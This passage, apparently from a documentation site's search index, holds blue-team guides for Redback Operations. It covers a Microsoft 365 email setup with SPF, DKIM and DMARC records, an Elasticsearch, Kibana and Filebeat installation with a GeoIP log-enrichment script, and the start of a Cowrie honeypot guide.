capabilities and email authentication protocols such as SPF, DKIM, and DMARC.High availability is supported by Microsoft’s global infrastructure.    ","version":"Next","tagName":"h3"},{"title":"2.2. Set up Email Infrastructure by Configuring the Selected ESP​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#22-set-up-email-infrastructure-by-configuring-the-selected-esp","content":" 2.2.1. Setup Process:​  For this project, the Microsoft 365 Developer Program was used to set up the M365 Exchange Online email infrastructure. More Information  2.2.2. Program Sign-Up:​  Sign up for the Microsoft 365 Developer Program for the project implementation.   Note: For this project, the ‘Instant sandbox’ option was chosen for quick setup. However, it is recommended to go with the ‘Configurable sandbox’ option. If you select a configurable sandbox, you can customize your domain name.You will have an empty sandbox that you must populate with sample data.The provisioning of the ‘Configurable sandbox’ may take up to two days.    ","version":"Next","tagName":"h3"},{"title":"2.3. Create an Initial Email Account​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#23-create-an-initial-email-account","content":" 2.3.1. Create Account:​  Create an initial email account (e.g., adm-redbackops@redbackops.com) as part of the Microsoft 365 Developer Program sign-up process.     ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#references","content":" Register a domain name - Business.gov.auWhat is domain privacy - GoDaddyUnlock or lock my domain - GoDaddyMicrosoft 365 Developer Program OverviewGet started with Microsoft 365 Developer Program ","version":"Next","tagName":"h2"},{"title":"Implementation of a Secure Email Infrastructure for Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#introduction","content":" This document provides a brief overview of the objective, rationale, and methodology for developing a secure email infrastructure at Redback Operations. As Redback Operations has no existing domain and email infrastructure, this project focuses on implementing a robust, scalable, and secure email infrastructure to support the company’s operational and cybersecurity requirements. This project initiative aligns with Redback Operations’ mission of innovation, quality management, and security excellence.    ","version":"Next","tagName":"h2"},{"title":"Project Background, Objectives and Justification​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#project-background-objectives-and-justification","content":" ","version":"Next","tagName":"h2"},{"title":"Project Background​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#project-background","content":" Redback Operations currently lacks an email infrastructure. As a result, it presents operational challenges which are outlined below:  Communication Inefficiency: Challenges in establishing professional communication channels with stakeholders, clients, and team members. Susceptible to Security Threats: The absence of a domain-specific email infrastructure increases the exposure and attack surface to security threats such as phishing, spoofing, and BEC (Business Email Compromise). Lack of Scalability: The absence of a secure and centralized email infrastructure limits the company’s ability to: Support future growthSeamlessly integrate with the company’s systems, projects, and teamsEstablish a centralized security administration for managing email identities and security policies.    ","version":"Next","tagName":"h3"},{"title":"Project Objectives​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#project-objectives","content":" The major objective of this project is to address the challenges listed above, and as a result, enable secure communication, improve operational efficiency, and safeguard the company against email-based threats. This is achieved through the following:  Establishment of a Secure Email InfrastructureImplementation of Email Security ProtocolsImplementation of Industry-Standard Security Controls (e.g., CIS Benchmarks)Enhancement of Scalability and SecurityDevelopment of Comprehensive Documentation  To support the achievement of the project objectives, Microsoft 365 Exchange Online was chosen as the preferred platform based on the following criteria:  Advanced security features, compliance, and governance capabilities.Scalability features to support future growth and integration with the company’s other systems.Support for advanced security capabilities and email authentication protocols such as SPF, DKIM, and DMARC.High availability is supported by Microsoft’s global infrastructure.    ","version":"Next","tagName":"h2"},{"title":"Alternatives​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#alternatives","content":" Before proceeding with this project initiative of implementing a secure infrastructure using Microsoft 365 and GoDaddy, alternative solutions were explored to address the communication and security needs of Redback Operations. The alternatives explored are outlined below:  ","version":"Next","tagName":"h2"},{"title":"1. Alternative 1: Use Free Email Services (e.g., Gmail, Hotmail, or Yahoo)​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#1alternative-1-use-free-email-services-eg-gmail-hotmail-or-yahoo","content":" Description: Utilize free email services such as Gmail, Hotmail or Yahoo to create email accounts for Redback Operations.  Advantages: • Zero initial setup cost. • Easy to create and configure email accounts without requiring any specialized knowledge.  Disadvantages: • Lacks credibility and professionalism due to generic domains (eg: blueteam-redbackops@gmail.com). • Limited options for advanced configuration, customization, and security features compared to enterprise-grade solutions. • No provision for centralized administration of email identities and security policies.  Conclusion: This alternative was not selected due to limitations in scalability, security, and brand alignment.  ","version":"Next","tagName":"h3"},{"title":"2. Alternative 2: Self-Hosted Email Server​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#2alternative-2-self-hosted-email-server","content":" Description: Set up an on-premises email server within Redback Operations’ on-premises infrastructure.  Advantages: • Full control over email infrastructure and security configurations. • No dependency on third-party providers.  Disadvantages: • Requires an existing robust on-premises infrastructure, and likely incurs significant upfront implementation and ongoing maintenance efforts and costs. • Requires dedicated resources – in terms of infrastructure and personnel. • High risk of outages and downtime without proper redundancy mechanisms.  Conclusion: This alternative was not selected due to the lack of an existing robust on-premises infrastructure at Redback Operations, as well as the significant cost and efforts required for implementation and maintenance.    ","version":"Next","tagName":"h3"},{"title":"Project Scope​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#project-scope","content":" ","version":"Next","tagName":"h2"},{"title":"Included in Scope​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#included-in-scope","content":" Domain RegistrationEmail Service Provider (ESP) SetupEmail Account CreationDNS ConfigurationEmail Security ImplementationDocumentation: As-Built DocumentationHandover Documentation  ","version":"Next","tagName":"h3"},{"title":"Excluded from Scope​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#excluded-from-scope","content":" Integration with third-party tools or services (except for Valimail used for DMARC monitoring).    ","version":"Next","tagName":"h3"},{"title":"Methodology​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#methodology","content":" ","version":"Next","tagName":"h2"},{"title":"Phase 1 – Domain Registration & Email Infrastructure Setup​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#phase-1--domain-registration--email-infrastructure-setup","content":" 1. Domain Registration​  1.1. Register a new domain (e.g., redbackops.com) with a secure and reputable registrar. 1.2. Enable domain security features such as Domain Privacy and Domain Lock.  2. Email Service Provider (ESP) Setup​  2.1. Research and select an ESP. 2.2. Set up email infrastructure by configuring the selected ESP. 2.3. Create an initial email account (e.g., `adm-redbackops@redbackops.com).  ","version":"Next","tagName":"h3"},{"title":"Phase 2 – Initial Email Setup and DNS Configuration​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#phase-2--initial-email-setup-and-dns-configuration","content":" 3. Email Infrastructure Setup​  3.1. Set up email infrastructure by configuring the selected ESP with the registered domain.  4. DNS Configuration &amp; Validation​  4.1. Configure DNS records: 4.1.1. Add a TXT record to verify domain ownership. 4.1.2. Add an MX record to route emails to the domain. 4.1.3. Add a CNAME record to configure email settings for users automatically. 4.1.4. Add a TXT record to configure SPF. 4.1.5. Add CNAME records to configure DKIM. 4.1.6. Add a TXT record to configure DMARC.  5. DNS Propagation Validation:​  5.1. Using online tools such as MXToolbox and Dmarcian. 5.2. Using command-line tools such as nslookup.  6. New E-mail Identities/Users Creation​  6.1. Create the initial batch of new e-mail identities/users for Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Phase 3 – SPF, DKIM, and DMARC Implementation​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#phase-3--spf-dkim-and-dmarc-implementation","content":" 7. Email Authentication Protocols Implementation (SPF, DKIM, DMARC)​  7.1. Configure SPF 7.2. Enable DKIM 7.3. Implement DMARC: 7.3.1. Configure DMARC policy 7.3.2. Configure DMARC monitoring and reporting using Valimail  8. Email Authentication Protocols Validation (SPF, DKIM, DMARC)​  8.1. Use online tools such as MXToolbox, Dmarcian. 8.2. Use command-line tools such as nslookup.  9. Email Authentication Protocols Functional Test (SPF, DKIM, DMARC)​  9.1. Send test e-mail using a redbackops.com email account (e.g., adm-redbackops@redbackops.com) through Outlook, and checking e-mail headers. 9.2. Send a test e-mail using a third-party email service provider (e.g.: MailChimp), sending a test e-mail, and checking e-mail headers. 9.3. Perform a spoofing test using online tools such as https://www.dmarctester.com/ .  ","version":"Next","tagName":"h3"},{"title":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#phase-4--additional-security-controls-based-on-the-cis-foundations-benchmark-guidelines","content":" 10. Implement additional security controls based on CIS Foundations Benchmark guidelines:​  10.1. Anti-phishing Policy 10.2. Anti-spam Policy 10.3. Anti-malware Policy 10.4. Safe Attachments Policy 10.5. Safe Links Policy 10.6. Common Attachment Types Filtering Policy 10.7. Connection Filtering Policy  11. Validate using the recommended audit guidelines per the CIS Foundations Benchmark.​  ","version":"Next","tagName":"h3"},{"title":"Phase 5 – Additional Security Controls​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#phase-5--additional-security-controls","content":" Implement and validate Mail Transport Rules to block emails from malicious senders and/or sender domains.Configure and alidate Connection Filter Policy to block emails from malicious IP addresses.Enable and validate Email Activity Auditing and Logging for all mailboxes.Enforce Multi-Factor Authentication (MFA) for user accounts (except for Breakglass accounts).Implement and validate Strict TLS encryption via MTA-STS policy instead of Opportunistic TLS for all email transmissions to ensure data confidentiality and integrity during transport.    ","version":"Next","tagName":"h3"},{"title":"Acceptance (Key Success Factors)​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#acceptance-key-success-factors","content":" The acceptance criteria for the project are outlined below:  Domain Registration: Successful registration of a domain that aligns with the company’s branding. Email Infrastructure: Successful implementation of a functional email infrastructure. Email Authentication Protocols: Successful implementation and validation of email authentication security protocols (SPF, DKIM, DMARC). CIS Benchmark Controls: Successful implementation and validation of CIS Benchmark recommended controls. Advanced Security Controls: Successful implementation and validation of advanced security controls: Mail Transport Rules to block malicious senders and sender domains.Connection Filter Policy to block malicious IP addresses.Auditing and logging for all mailboxes.Multi-Factor Authentication (MFA) for all accounts.Strict TLS encryption for email transmissions (using MTA-STS policy).    ","version":"Next","tagName":"h2"},{"title":"Outcomes​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#outcomes","content":" Operational Efficiency and Improved Credibility: Enables professional email communication channels.Increases trust and credibility among stakeholders and clients. Enhanced Security: Reduces exposure to email-based threats such as phishing, spoofing, and BEC. Scalability: Supports future growth and seamless integration with company systems and projects. Centralized Administration: Provides centralized oversight over email identities and security policies. Increased Visibility: DMARC reporting allows monitoring of unauthorized email use and continuous improvement in email security.    ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#conclusion","content":" The establishment of a robust, scalable, and secure email infrastructure enables Redback Operations to enhance its operational capabilities and uplift its security posture. By addressing the existing challenges, this project ensures professional communication, safeguards against email-based threats, and supports the company's growth.    ","version":"Next","tagName":"h2"},{"title":"Terminology​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#terminology","content":" Acronym/Abbreviation\tDefinitionBEC\tBusiness Email Compromise: A type of email-based cybercrime where a scammer uses email to abuse trust in the business processes to scam someone into sending money, goods, or divulging confidential company information. CIS\tCenter for Internet Security: A non-profit organization that helps people, businesses, and governments protect themselves against cyber threats. CNAME\tCanonical Name Record: A type of DNS record that points a domain name (an alias) to another domain. DKIM\tDomainKeys Identified Mail: An email authentication protocol that adds a digital signature to emails, verifying the sender’s identity and preventing email tampering, ensuring integrity. DLP\tData Loss Prevention: A security measure to prevent inappropriate sharing, transfer, or use of sensitive data. DMARC\tDomain-based Message Authentication, Reporting, and Conformance: An email authentication protocol that provides a policy framework for enforcing SPF and DKIM checks and domain alignment, and generating reports on email authentication results. DNS\tDomain Name System: A name database that maps domain names to their corresponding Internet Protocol (IP) addresses. ESP\tEmail Service Provider: A company or a platform that provides email hosting and delivery services. MFA\tMulti-Factor Authentication: A multi-step account access process that requires users to provide two or more forms of verification. MX\tMail Exchange: A type of DNS record that points to where emails for a domain should be routed. SPF\tSender Policy Framework: An email authentication protocol that verifies whether or not the sender is authorized to send emails on behalf of a domain. TLS\tTransport Layer Security: An encryption protocol that enables parties to communicate securely over the internet. TXT\tText Record: A type of DNS record that allows the domain owner to store text values in the DNS, often used for verification and authentication purposes.    ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Implementation of a Secure Email Infrastructure for Redback Operations","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/#references","content":" Site24x7: DNS Record TypesPowerDMARC: SPF, DKIM, DMARCCyber.gov.au: TLS ImplementationMicrosoft: Data Loss Prevention (DLP)   ","version":"Next","tagName":"h2"},{"title":"Phase 2 – Initial Email Setup and DNS Configuration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#objective","content":" The objective of this phase is to configure and validate the required fundamental DNS records to ensure email functionality and security. This phase ensures that the domain is correctly set up to handle email traffic. In addition, this phase lays the foundation for advanced security configurations. Furthermore, the initial batch of new email identities/users is created in this phase. Overall, this phase focuses on:  Initial Email Infrastructure Setup.DNS Configuration and Validation.Email Identities/Users Creation.  ","version":"Next","tagName":"h2"},{"title":"Deliverables​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#deliverables","content":" Email infrastructure configured with the registered domain.Configured DNS records for the domain.Validated DNS propagation of the configured DNS records.New email accounts.    ","version":"Next","tagName":"h2"},{"title":"3. Email Infrastructure Setup​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#3-email-infrastructure-setup","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Set up Email Infrastructure by configuring the selected ESP with the registered domain.​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#31-set-up-email-infrastructure-by-configuring-the-selected-esp-with-the-registered-domain","content":" 3.1.1. Follow the steps in the screenshots below to complete this section.   3.1.2. Publish the DNS record shown in the screenshot below in the DNS Management section of the registrar (GoDaddy): GoDaddy DNS Management   3.1.3. Publish the DNS record shown in the screenshot below in the DNS Management section of the registrar (GoDaddy): GoDaddy DNS Management same as in step 3.1.2. above.    ","version":"Next","tagName":"h3"},{"title":"4. DNS Configuration​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#4-dns-configuration","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 Configure DNS Records​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#41-configure-dns-records","content":" Ensure the following DNS records are published in the DNS of the domain:  Record Type\tName/Host\tValue\tTTL\tPriorityTXT\t@\tMS=ms87813099\t1 Hour\tN/A MX\t@\tredbackops-com.mail.protection.outlook.com\t1 Hour\t0 CNAME\tautodiscover\tautodiscover.outlook.com\t1 Hour\tN/A TXT (SPF)\t@\tv=spf1 include:spf.protection.outlook.com -all\t1 Hour\tN/A      ","version":"Next","tagName":"h3"},{"title":"5. DNS Propagation Validation​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#5-dns-propagation-validation","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Using Online Tools (e.g., MXToolbox)​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#51-using-online-tools-eg-mxtoolbox","content":" 5.1.1. Validate TXT record MS=ms87813099 provided by the email service provider to verify domain ownership.   5.1.2. Validate MX record redbackops-com.mail.protection.outlook.com to route emails to the domain.   5.1.3. Validate CNAME record autodiscover.outlook.com to configure email settings for users automatically.   5.1.4. Validate SPF record v=spf1 include:spf.protection.outlook.com -all.   ","version":"Next","tagName":"h3"},{"title":"5.2 Using Command Line Tools (e.g., nslookup)​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#52-using-command-line-tools-eg-nslookup","content":" 5.2.1. Validate TXT record: nslookup -type=TXT redbackops.com   5.2.2. Validate MX record: nslookup -type=MX redbackops.com   5.2.3. Validate CNAME record: nslookup -type=CNAME autodiscover.redbackops.com   5.2.4. Validate SPF record: nslookup -type=TXT redbackops.com     ","version":"Next","tagName":"h3"},{"title":"6.6. New E-mail Identities/Users Creation​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#66new-e-mail-identitiesusers-creation","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Create the Initial Batch of New Email Identities/Users​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#61-create-the-initial-batch-of-new-email-identitiesusers","content":" 6.1.1. Use PowerShell script to create the initial batch of new email identities/users. PowerShell Script: Create Users 6.1.2. Validate that the users have been created in Microsoft Admin Center: Microsoft Admin Center.   6.1.3. Ensure that the users have been assigned licenses.     ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Phase 2 – Initial Email Setup and DNS Configuration","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase2#references","content":" MXToolboxMicrosoft Admin CenterGoDaddy DNS Management ","version":"Next","tagName":"h2"},{"title":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip","content":"","keywords":"","version":"Next"},{"title":"Note: disabling security is only when you run in your localhost and not with redback server. When installing in redback server, make sure to enable all security and have password for your accounts. Please include the ssl certificates as well. The link provided above for the installation will guide you with that process. Ill pin a video below as well which walks you through setting it with the required security measures.​","type":1,"pageTitle":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip#note-disabling-security-is-only-when-you-run-in-your-localhost-and-not-with-redback-server-when-installing-in-redback-server-make-sure-to-enable-all-security-and-have-password-for-your-accounts-please-include-the-ssl-certificates-as-well-the-link-provided-above-for-the-installation-will-guide-you-with-that-process-ill-pin-a-video-below-as-well-which-walks-you-through-setting-it-with-the-required-security-measures","content":" Once the configuration is finished, go to browser and enter:http://Localhost:9200  This should show you the elastic interface. Elastic itself doesn’t have an interface, that’s where we use Kibana, which is integrated with elastic for visualization.  Installing Kibana:  go to your browser and use this link: https://www.elastic.co/guide/en/kibana/current/deb.htmlnow we have already installed the pre – requisites like elastic pgp key, transport https and keys that’s required. So, skip to this part:  Run this command to install kibana: sudo apt-get update &amp;&amp; sudo apt-get install Kibana  after installing kibana, to enable it and start and stop, use these commands:  sudo /bin/systemctl daemon-reload sudo /bin/systemctl enable kibana.service  sudo systemctl start kibana.service sudo systemctl stop kibana.service  kibana’s configuration is fine as is. Incase if you need to access the directory and configure something, use this command: cd /etc/kibana  now go to your browser and enter the url: localhost:5601  The setup should take a while to load in the browser. Wait for it and choose to explore on your option and that should load this interface in your browser.  Filebeat installation:  use the command:apt-get install filebeatthis should install filebeat in the system.  Filebeat configuration:  go to filebeat directory using:cd /etc/filebeatyou will find filebeat.yml. to edit it usenano filebeat.yml  First configure filebeat.input. this is where the you can set paths to read logs. Section Explanation  filebeat.inputs:• Defines the list of inputs that Filebeat will monitor to collect data. In this case, the input type is log.type: log• Specifies the input type as log. This means Filebeat will monitor log files for new entries.id: my-filestream-id• Assigns a unique ID to the input configuration. This can help manage and debug multiple inputs.enabled: true• Indicates that this input configuration is active.paths:• Lists the file paths to monitor. • Example: - /tmp/enriched_network_logs_with_geoip.json is an active path, while others are commented out (e.g., - /tmp/sample_network_logs.json).• Filebeat will monitor these files for new log entries and forward them for further processing.json:• Specifies settings for processing JSON-formatted log files.  #JSON Configuration Options  keys_under_root: true  Brings the JSON fields directly into the root of the event in ElasticsearchFor example, if the JSON log contains {&quot;field1&quot;: &quot;value1&quot;, &quot;field2&quot;: &quot;value2&quot;}, these fields will appear at the root level instead of being nested under a JSON object  add_error_key: true• Adds an error key to the event if there is an issue parsing the JSON. • Useful for debugging malformed logs or unexpected structures.overwrite_keys: true• Allows fields from the JSON logs to overwrite existing fields in the event. • For instance, if a JSON log contains a field timestamp that differs from Filebeat’s default timestamp, the JSON value will overwrite it.  ","version":"Next","tagName":"h3"},{"title":"Note: I recommend using the file paths:​","type":1,"pageTitle":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip#note-i-recommend-using-the-file-paths","content":" - /var/log/*.log - c:\\programdata\\elasticsearch\\logs*  ","version":"Next","tagName":"h3"},{"title":"(Reason: these paths read the logs in your system. Just uncomment the path or remove the hash Infront. The file path you see in the screenshot is a log file that I created so it exists only in my system. The 2 paths mentioned above are common in all systems)​","type":1,"pageTitle":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip#reason-these-paths-read-the-logs-in-your-system-just-uncomment-the-path-or-remove-the-hash-infront-the-file-path-you-see-in-the-screenshot-is-a-log-file-that-i-created-so-it-exists-only-in-my-system-the-2-paths-mentioned-above-are-common-in-all-systems","content":"   Edit configuration:  Under dashboards: setup.dashboards.enabled: true This will help in generating dashboards. Under kibana : host: &quot;localhost:5601&quot; This will connect filebeat with kibana.  Under elasticsearch output: hosts: [&quot;localhost:9200&quot;]  Explanation of Each Processor  add_host_metadata:• Adds metadata about the host where Filebeat is running, such as the hostname, IP addresses, and operating system details. • Condition: • Only applies when the log event does not have the tag forwarded. • This prevents redundant host metadata from being added to logs already tagged as forwarded (e.g., logs originating from other systems).add_locale:• Adds locale information (e.g., time zone and language settings) of the system running Filebeat. • indicates default behavior without any additional configuration.add_cloud_metadata:• Adds metadata about the cloud environment where Filebeat is running, such as cloud provider (AWS, Azure, GCP), instance ID, region, and machine type. • Useful for analyzing logs from cloud-based systems.add_docker_metadata:• Adds metadata for logs coming from Docker containers, such as container ID, image name, and labels. • Use Case: • Helps identify which container generated a particular log, especially in environments with multiple containers.add_kubernetes_metadata:• Adds Kubernetes-specific metadata to logs, including pod name, namespace, and labels. • Use Case: • Essential for logs in Kubernetes clusters to trace logs back to specific pods or namespaces.decode_json_fields:• Decodes JSON-formatted strings within specific fields into structured data. • Parameters:• fields: [&quot;message&quot;]: Specifies the field(s) to decode, in this case, the message field. • target: &quot;parsed_json&quot;: The decoded JSON is stored in the parsed_json field. • overwrite_keys: true: If there are conflicts between decoded JSON keys and existing keys, the decoded values will overwrite the existing ones. • Use Case: • Useful for logs that embed JSON strings in fields like message. Decoding makes the data searchable and analysable in Elasticsearch.  The yml files configuration for elastic, Kibana and filebeat are done now.  ","version":"Next","tagName":"h3"},{"title":"Kibana setup and configurations in browser:​","type":1,"pageTitle":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip#kibana-setup-and-configurations-in-browser","content":" Go to kibana in browser: localhost:5601 Click on the menu bar on top left and scroll down to management and go to stack management. In management go to index management. This is the place where you can mange your indexes  What are indexes?  An index in Elasticsearch is a collection of documents that share similar characteristics. It acts as a logical namespace for storing and managing data.  Key Features:  • Structure: Data in an index is stored in JSON format, where each document has fields and values.  • Organization: Think of it as a database table, but more flexible and schema-less by default.  • Search: You can query an index to retrieve specific documents using Elasticsearch Query DSL.  Use in Kibana:• Kibana connects to Elasticsearch indexes to analyze and visualize the data stored in them.  • For example, an index named network-logs might store network traffic logs.  Examples of Indexes:• filebeat-* (logs ingested by Filebeat) • logs-* (generic logs) • metrics-* (metrics data)  now go back to the main menu and go to analytics and then to discover:  in this go to the top left and you find data view, click on it. By default since we installed filebeat there will be an index patter called filebeat-*. Click on it and you will see all the logs coming through filebeat.  You can set option to view specific fields that are available. For example, now Ill choose host ip filed with will show the ip of host in the logs:  Setting dashboards:  Go to the main menu and select dashboards. In search bar search for sudo.  If you add that dashboard, you can see the Sudo commands that were run with the system. On the top right you can also see 3 others different dashboards, ssh login, new users and groups and syslogs. You can click on each dashboard and see the logs of it and the charts.  Sudo:    Syslogs:    New users and groups:    Using geoip to locate the Ip address:  For visualizing the logs in kibana. We need geoip. Geoip is a location database which locates ip address with longitude and latitude. To do that ill put down a example python code. This will use the existing log file and convert it with geoip modules:  Python Code Example   import json import geoip2.database # File paths log_file = &quot;/tmp/generated_logs.json&quot; # Input raw logs geoip_db = &quot;/path/to/GeoLite2-City.mmdb&quot; # GeoIP database output_file = &quot;/tmp/processed_logs.json&quot; # Output enriched logs # Load GeoIP database geo_reader = geoip2.database.Reader(geoip_db) # Function to fetch geographical data def get_geo_data(ip): try: response = geo_reader.city(ip) return { &quot;city&quot;: response.city.name, &quot;country&quot;: response.country.name, &quot;latitude&quot;: response.location.latitude, &quot;longitude&quot;: response.location.longitude } except Exception as e: print(f&quot;Error processing IP {ip}: {e}&quot;) return None # Process logs with open(log_file, &quot;r&quot;) as infile, open(output_file, &quot;w&quot;) as outfile: for line in infile: log = json.loads(line) # Parse the log entry geo_data = get_geo_data(log[&quot;destination_ip&quot;]) # Get GeoIP data for destination IP if geo_data: log[&quot;geo_location&quot;] = geo_data # Add geographical data to the log outfile.write(json.dumps(log) + &quot;\\n&quot;) # Save enriched log print(f&quot;Processed logs saved at {output_file}&quot;)   ","version":"Next","tagName":"h2"},{"title":"Explanation:​","type":1,"pageTitle":"Setup guide for Elasticsearch, Kibana and Filebeat (in ubuntu for localhost)","url":"/redback-documentation/docs/cybersecurity/Blue Team/elf-stack-geoip#explanation","content":" Import Libraries:  json: Parse and write JSON logs.geoip2.database: Fetch GeoIP data for IP addresses.  File Paths:  Define paths for the raw log file, GeoIP database, and output file.  Open GeoIP Database:  Load the GeoLite2-City.mmdb database for IP lookups.  Initialize File Handling:  Open the raw log file for reading and create an output file for processed logs.  Process Each Log Entry:  Read and parse logs from the input file line by line.Extract IP addresses (client_ip, destination_ip, source_ip).For each IP address, query the GeoIP database to retrieve geolocation details like city, country, latitude, and longitude.  Append GeoIP Data:  Add geolocation details to each log entry under relevant keys.  Write Processed Logs:  Write updated log entries (with geolocation data) to the output file.  Error Handling:  Catch and log any exceptions, such as invalid IP addresses or missing data in the GeoIP database.  Close Files and Cleanup:  Ensure all files are properly closed after processing.  Now after doing this, replace the filepath in filebeat.inputs in filebeat.yml. Then go to Kibana – Maps – Create Maps:    Then go to Add Layers and then select Documents.  Then select the data views that you want (that have the logs) and that should locate the IP address in the maps. ","version":"Next","tagName":"h3"},{"title":"Cowrie Honeypot Implementation Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#introduction","content":" The comprehensive instructions for establishing a Cowrie honeypot are provided in this document The honeypot oﬀers a regulated setting for recording and examining harmful activity directed towards a server. The purpose of this article is to help aspiring workers set up and manage a Cowrie honeypot eﬃciently.    